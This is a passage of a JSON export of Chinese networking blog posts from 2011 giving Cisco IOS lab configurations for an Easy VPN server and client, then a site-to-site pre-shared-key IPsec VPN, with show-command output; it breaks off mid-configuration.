Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config)#</span><span style=\"color: #c00000;\"><span style=\"font-family: Arial,sans-serif;\"><strong>username cisco secret cisco</strong></span></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config)#</span><span style=\"color: #0070c0;\"><span style=\"font-family: Arial,sans-serif;\"><strong>crypto isakmp policy 10</strong></span></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config-isakmp)#</span><span style=\"color: #0070c0;\"><span style=\"font-family: Arial,sans-serif;\"><strong>encryption 3des</strong></span></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config-isakmp)#</span><span style=\"color: #0070c0;\"><span style=\"font-family: Arial,sans-serif;\"><strong>hash sha</strong></span></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config-isakmp)#</span><span style=\"color: #0070c0;\"><span style=\"font-family: Arial,sans-serif;\"><strong>authentication pre-shar</strong></span></span><span style=\"font-family: Arial,sans-serif;\">e </span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config-isakmp)#</span><span style=\"color: #0070c0;\"><span style=\"font-family: Arial,sans-serif;\"><strong>group 2</strong></span></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config-isakmp)#</span><span style=\"font-family: Arial,sans-serif;\"><strong>exit</strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config)#</span><span style=\"color: #0070c0;\"><span style=\"font-family: Arial,sans-serif;\"><strong>crypto isakmp keepalive 20 3</strong></span></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config)#</span><span style=\"color: #7030a0;\"><span style=\"font-family: Arial,sans-serif;\"><strong>ip local pool vpn 192.168.3.100 192.168.3.120</strong></span></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config)#</span><span style=\"color: #7030a0;\"><span style=\"font-family: Arial,sans-serif;\"><strong>access-list 100 permit ip 192.168.3.0 0.0.0.255 any</strong></span></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config)#</span><span style=\"color: #7030a0;\"><span style=\"font-family: Arial,sans-serif;\"><strong>crypto isakmp client configuration group vpn</strong></span></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config-isakmp-group)#</span><span style=\"color: #7030a0;\"><span style=\"font-family: Arial,sans-serif;\"><strong>acl 100</strong></span></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config-isakmp-group)#</span><span style=\"color: #7030a0;\"><span style=\"font-family: Arial,sans-serif;\"><strong>include-local-lan</strong></span></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config-isakmp-group)#</span><span style=\"color: #7030a0;\"><span style=\"font-family: Arial,sans-serif;\"><strong>key vpn</strong></span></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config-isakmp-group)#</span><span style=\"color: #7030a0;\"><span style=\"font-family: Arial,sans-serif;\"><strong>max-users 20</strong></span></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config-isakmp-group)#</span><span style=\"color: #7030a0;\"><span style=\"font-family: Arial,sans-serif;\"><strong>max-logins 1</strong></span></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config-isakmp-group)#</span><span style=\"color: #7030a0;\"><span style=\"font-family: Arial,sans-serif;\"><strong>pfs</strong></span></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config-isakmp-group)#</span><span style=\"color: #7030a0;\"><span style=\"font-family: Arial,sans-serif;\"><strong>pool vpn</strong></span></span></span></p>\n\n<p><!--more--></p>\n\n<p>&nbsp;</p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config-isakmp-group)#</span><span style=\"color: #7030a0;\"><span style=\"font-family: Arial,sans-serif;\"><strong>save-password</strong></span></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config-isakmp-group)#</span><span style=\"font-family: Arial,sans-serif;\"><strong>exit</strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config)#</span><span style=\"color: #984806;\"><span style=\"font-family: Arial,sans-serif;\"><strong>crypto ipsec transform-set cisco esp-3des esp-sha-hmac</strong></span></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(cfg-crypto-trans)#</span><span style=\"font-family: Arial,sans-serif;\"><strong>exit</strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config)#</span><span style=\"color: #00b050;\"><span style=\"font-family: Arial,sans-serif;\"><strong>crypto dynamic-map mymap 10</strong></span></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config-crypto-map)#</span><span style=\"color: #00b050;\"><span style=\"font-family: Arial,sans-serif;\"><strong>set transform-set cisco</strong></span></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config-crypto-map)#</span><span style=\"color: #00b050;\"><span style=\"font-family: Arial,sans-serif;\"><strong>reverse-route</strong></span></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config-crypto-map)#</span><span style=\"font-family: Arial,sans-serif;\"><strong>exit</strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config)#</span><span style=\"color: #00b050;\"><span style=\"font-family: Arial,sans-serif;\"><strong>crypto map ezvpn client authentication list ezvpn</strong></span></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config)#</span><span style=\"color: #00b050;\"><span style=\"font-family: Arial,sans-serif;\"><strong>crypto map ezvpn client configuration address respond</strong></span></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config)#</span><span style=\"color: #00b050;\"><span style=\"font-family: Arial,sans-serif;\"><strong>crypto map ezvpn isakmp authorization list ezvpn</strong></span></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config)#</span><span style=\"color: #00b050;\"><span style=\"font-family: Arial,sans-serif;\"><strong>crypto map ezvpn 65535 ipsec-isakmp dynamic mymap</strong></span></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config)#</span><span style=\"font-family: Arial,sans-serif;\"><strong>int e1/3</strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config-if)#</span><span style=\"color: #00b050;\"><span style=\"font-family: Arial,sans-serif;\"><strong>crypto map ezvpn</strong></span></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config-if)#</span><span style=\"font-family: Arial,sans-serif;\"><strong>end</strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1#</span><span style=\"font-family: Arial,sans-serif;\"><strong>wr</strong></span></span></p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p><span style=\"color: #c00000;\"><span style=\"font-size: medium;\"><strong>远端配置</strong></span><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\"><span style=\"font-size: medium;\"><strong>(R5) – </strong></span></span></span></span><span style=\"color: #c00000;\"><span style=\"font-size: medium;\"><strong>远端为</strong></span><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\"><span style=\"font-size: medium;\"><strong>Cisco</strong></span></span></span></span><span style=\"color: #c00000;\"><span style=\"font-size: medium;\"><strong>设备</strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">Router&gt;<strong>enable</strong> </span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">Router#<strong>configure terminal</strong> </span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">Router(config)#<strong>host R5</strong></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R5(config)#<strong>line console 0</strong></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R5(config-line)#<strong>logging synchronous</strong> </span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R5(config-line)#<strong>exit</strong></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R5(config)#<strong>int e0/3</strong></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R5(config-if)#<strong>no shutdown</strong> </span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R5(config-if)#<strong>ip address 192.168.15.5 255.255.255.0</strong></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R5(config-if)#<strong>exit</strong></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R5(config)#<strong>int e0/0</strong> </span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R5(config-if)#<strong>no shutdown</strong> </span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R5(config-if)#<strong>ip address 192.168.2.1 255.255.255.0</strong></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R5(config-if)#<strong>exit</strong></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R5(config)#<strong>ip route 0.0.0.0 0.0.0.0 192.168.15.1</strong></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R5(config)#<strong>int loopback 0</strong></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R5(config-if)#<strong>ip add 192.168.3.10 255.255.255.0</strong></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R5(config-if)#<strong>exit</strong></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R5(config)#<span style=\"color: #c00000;\"><strong>crypto ipsec client ezvpn vpn</strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R5(config-crypto-ezvpn)#<span style=\"color: #c00000;\"><strong>connect auto</strong></span> </span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R5(config-crypto-ezvpn)#<span style=\"color: #c00000;\"><strong>group vpn key vpn</strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R5(config-crypto-ezvpn)#<span style=\"color: #c00000;\"><strong>mode client </strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R5(config-crypto-ezvpn)#<span style=\"color: #c00000;\"><strong>peer 192.168.15.1</strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R5(config-crypto-ezvpn)#<span style=\"color: #c00000;\"><strong>username cisco password cisco</strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R5(config-crypto-ezvpn)#<span style=\"color: #c00000;\"><strong>xauth userid mode local</strong></span> </span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R5(config-crypto-ezvpn)#<strong>exit</strong></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R5(config)#<strong>interface e0/0</strong></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R5(config-if)#<span style=\"color: #0070c0;\"><strong>crypto ipsec client ezvpn vpn inside </strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R5(config-if)#<strong> interface e0/3</strong></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R5(config-if)#<span style=\"color: #0070c0;\"><strong>crypto ipsec client ezvpn vpn outside</strong></span> </span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R5(config-if)#</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R5(config-if)#</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R5(config-if)#</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R5#sh crypto ipsec client ezvpn </span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">Easy VPN Remote Phase: 4</span></p>\n\n<p>&nbsp;</p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">Tunnel name : vpn</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">Inside interface list: Ethernet0/0</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">Outside interface: Ethernet0/3 </span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">Current State: IPSEC_ACTIVE</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">Last Event: SOCKET_UP</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">Address: 192.168.3.100</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">Mask: 255.255.255.255</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">Using PFS Group: 2</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">Save Password: Allowed</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">Split Tunnel List: 1</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">Address : 192.168.3.0</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">Mask : 255.255.255.0</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">Protocol : 0x0</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">Source Port: 0</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">Dest Port : 0</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">Current EzVPN Peer: 192.168.15.1</span></p>\n\n<p>&nbsp;</p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R5#</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R5#</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R5#sh crypto isakmp sa</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">dst src state conn-id slot status</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">192.168.15.1 192.168.15.5 QM_IDLE 1 0 ACTIVE</span></p>\n\n<p>&nbsp;</p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R5#</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R5#</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R5#</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R5#show crypto session </span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">Crypto session current status</span></p>\n\n<p>&nbsp;</p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">Interface: Ethernet0/3</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">Session status: UP-ACTIVE </span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">Peer: 192.168.15.1 port 500 </span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">IKE SA: local 192.168.15.5/500 remote 192.168.15.1/500 Active </span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">IPSEC FLOW: permit ip host 192.168.3.100 0.0.0.0/0.0.0.0 </span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">Active SAs: 2, origin: crypto map</span></p>\n\n<p>&nbsp;</p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R5#</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">R5#</span></p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p><span style=\"color: #c00000;\"><span style=\"font-size: medium;\"><strong>远端配置</strong></span><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\"><span style=\"font-size: medium;\"><strong>(R5) – </strong></span></span></span></span><span style=\"color: #c00000;\"><span style=\"font-size: medium;\"><strong>远端为</strong></span><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\"><span style=\"font-size: medium;\"><strong>Cisco VPN</strong></span></span></span></span><span style=\"color: #c00000;\"><span style=\"font-size: medium;\"><strong>软件客户端</strong></span></span></p>\n",
    "date": {
      "year": "2011",
      "month": "July",
      "day": "30"
    }
  },
  {
    "id": 83,
    "title": "站到站VPN(预共享密钥)",
    "category": "vpn",
    "tags": [
      "预共享密钥"
    ],
    "url": "/archives/zhandaozhanvpnyugongxiangmiyue/",
    "content": "<p><span style=\"color: #c00000;\"><span style=\"font-family: Arial,sans-serif;\"><span style=\"font-size: medium;\"><strong>R1</strong></span></span><span style=\"font-size: medium;\"><strong>配置</strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config)#</span><span style=\"font-family: Arial,sans-serif;\"><strong>line con 0</strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config-line)#</span><span style=\"font-family: Arial,sans-serif;\"><strong>logg sy</strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config-line)#</span><span style=\"font-family: Arial,sans-serif;\"><strong>exit</strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config)#</span><span style=\"font-family: Arial,sans-serif;\"><strong>no ip domain-lookup</strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config)#</span><span style=\"font-family: Arial,sans-serif;\"><strong>int loopback 0</strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config-if)#</span><span style=\"font-family: Arial,sans-serif;\"><strong>ip add 1.1.1.1 255.255.255.255</strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config-if)#</span><span style=\"font-family: Arial,sans-serif;\"><strong>int f0/0</strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config-if)#</span><span style=\"font-family: Arial,sans-serif;\"><strong>no sh</strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config-if)#</span><span style=\"font-family: Arial,sans-serif;\"><strong>ip add 192.168.3.1 255.255.255.0</strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config-if)#</span><span style=\"font-family: Arial,sans-serif;\"><strong>int e1/3</strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config-if)#</span><span style=\"font-family: Arial,sans-serif;\"><strong>no sh</strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config-if)#</span><span style=\"font-family: Arial,sans-serif;\"><strong>ip add 192.168.15.1 255.255.255.0</strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config-if)#</span><span style=\"font-family: Arial,sans-serif;\"><strong>exit</strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config)#</span><span style=\"font-family: Arial,sans-serif;\"><strong>ip route 0.0.0.0 0.0.0.0 192.168.15.5</strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config)#</span><span style=\"color: #0070c0;\"><span style=\"font-family: Arial,sans-serif;\"><strong>access-list 100 permit ip 1.1.1.1 0.0.0.0 5.5.5.5 0.0.0.0</strong></span></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config)#</span><span style=\"color: #c00000;\"><span style=\"font-family: Arial,sans-serif;\"><strong>crypto isakmp policy 10</strong></span></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config-isakmp)#</span><span style=\"color: #c00000;\"><span style=\"font-family: Arial,sans-serif;\"><strong>authentication pre-share</strong></span></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config-isakmp)#</span><span style=\"color: #c00000;\"><span style=\"font-family: Arial,sans-serif;\"><strong>encryption aes 128</strong></span></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config-isakmp)#</span><span style=\"color: #c00000;\"><span style=\"font-family: Arial,sans-serif;\"><strong>group 2</strong></span></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config-isakmp)#</span><span style=\"color: #c00000;\"><span style=\"font-family: Arial,sans-serif;\"><strong>hash sha</strong></span></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config-isakmp)#</span><span style=\"font-family: Arial,sans-serif;\"><strong>exit</strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config)#</span><span style=\"color: #00b050;\"><span style=\"font-family: Arial,sans-serif;\"><strong>crypto ipsec transform-set cisco esp-aes 128 esp-sha-hmac<!--more--></strong></span></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(cfg-crypto-trans)#</span><span style=\"font-family: Arial,sans-serif;\"><strong>exit</strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config)#</span><span style=\"color: #c00000;\"><span style=\"font-family: Arial,sans-serif;\"><strong>crypto isakmp key cisco address 192.168.15.5 no-xauth</strong></span></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config)#</span><span style=\"color: #0070c0;\"><span style=\"font-family: Arial,sans-serif;\"><strong>crypto map mymap 10 ipsec-isakmp </strong></span></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config-crypto-map)#</span><span style=\"color: #0070c0;\"><span style=\"font-family: Arial,sans-serif;\"><strong>match address 100</strong></span></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config-crypto-map)#</span><span style=\"color: #0070c0;\"><span style=\"font-family: Arial,sans-serif;\"><strong>set transform-set cisco</strong></span></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config-crypto-map)#</span><span style=\"color: #0070c0;\"><span style=\"font-family: Arial,sans-serif;\"><strong>set peer 192.168.15.5</strong></span></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config-crypto-map)#</span><span style=\"color: #0070c0;\"><span style=\"font-family: Arial,sans-serif;\"><strong>set pfs</strong></span></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config-crypto-map)#</span><span style=\"font-family: Arial,sans-serif;\"><strong>exit</strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config)#</span><span style=\"font-family: Arial,sans-serif;\"><strong>int e1/3</strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config-if)#</span><span style=\"color: #0070c0;\"><span style=\"font-family: Arial,sans-serif;\"><strong>crypto map mymap</strong></span></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config-if)#</span><span style=\"font-family: Arial,sans-serif;\"><strong>end</strong></span></span></p>\n\n<p><!--more--></p>\n\n<p>&nbsp;</p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1#sh cry isa sa</span></span></p>\n\n<p><span style=\"font-family: Arial,sans-serif;\">IPv4 Crypto ISAKMP SA</span></p>\n\n<p><span style=\"font-family: Arial,sans-serif;\">dst src state conn-id status</span></p>\n\n<p><span style=\"font-family: Arial,sans-serif;\">192.168.15.5 192.168.15.1 QM_IDLE 1001 ACTIVE</span></p>\n\n<p>&nbsp;</p>\n\n<p><span style=\"font-family: Arial,sans-serif;\">IPv6 Crypto ISAKMP SA</span></p>\n\n<p>&nbsp;</p>\n\n<p><span style=\"font-family: Arial,sans-serif;\">R1#show crypto session </span></p>\n\n<p><span style=\"font-family: Arial,sans-serif;\">Crypto session current status</span></p>\n\n<p>&nbsp;</p>\n\n<p><span style=\"font-family: Arial,sans-serif;\">Interface: Ethernet1/3</span></p>\n\n<p><span style=\"font-family: Arial,sans-serif;\">Session status: UP-ACTIVE </span></p>\n\n<p><span style=\"font-family: Arial,sans-serif;\">Peer: 192.168.15.5 port 500 </span></p>\n\n<p><span style=\"font-family: Arial,sans-serif;\">IKE SA: local 192.168.15.1/500 remote 192.168.15.5/500 Active </span></p>\n\n<p><span style=\"font-family: Arial,sans-serif;\">IPSEC FLOW: permit ip host 1.1.1.1 host 5.5.5.5 </span></p>\n\n<p><span style=\"font-family: Arial,sans-serif;\">Active SAs: 2, origin: crypto map</span></p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"color: #c00000;\"><span style=\"font-family: Arial,sans-serif;\"><span style=\"font-size: medium;\"><strong>R5</strong></span></span></span></span><span style=\"color: #c00000;\"><span style=\"font-size: medium;\"><strong>配置</strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">Router(config)#</span><span style=\"font-family: Arial,sans-serif;\"><strong>host R5</strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R5(config)#</span><span style=\"font-family: Arial,sans-serif;\"><strong>line con 0</strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R5(config-line)#</span><span style=\"font-family: Arial,sans-serif;\"><strong>logg sy</strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R5(config-line)#</span><span style=\"font-family: Arial,sans-serif;\"><strong>exit</strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R5(config)#</span><span style=\"font-family: Arial,sans-serif;\"><strong>no ip domain-lookup</strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R5(config)#</span><span style=\"font-family: Arial,sans-serif;\"><strong>int loopback 0</strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R5(config-if)#</span><span style=\"font-family: Arial,sans-serif;\"><strong>ip add 5.5.5.5 255.255.255.255</strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R5(config-if)#</span><span style=\"font-family: Arial,sans-serif;\"><strong>int e0/0</strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R5(config-if)#</span><span style=\"font-family: Arial,sans-serif;\"><strong>no sh</strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R5(config-if)#</span><span style=\"font-family: Arial,sans-serif;\"><strong>ip add 192.168.2.1 255.255.255.0</strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R5(config-if)#</span><span style=\"font-family: Arial,sans-serif;\"><strong>int e0/3</strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R5(config-if)#</span><span style=\"font-family: Arial,sans-serif;\"><strong>no sh</strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R5(config-if)#</span><span style=\"font-family: Arial,sans-serif;\"><strong>ip add 192.168.15.5 255.255.255.</strong></span><span style=\"font-family: Arial,sans-serif;\">0</span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R5(config-if)#</span><span style=\"font-family: Arial,sans-serif;\"><strong>exit</strong></span></span></p>\n\n<p><span style=\"font-family: Times New 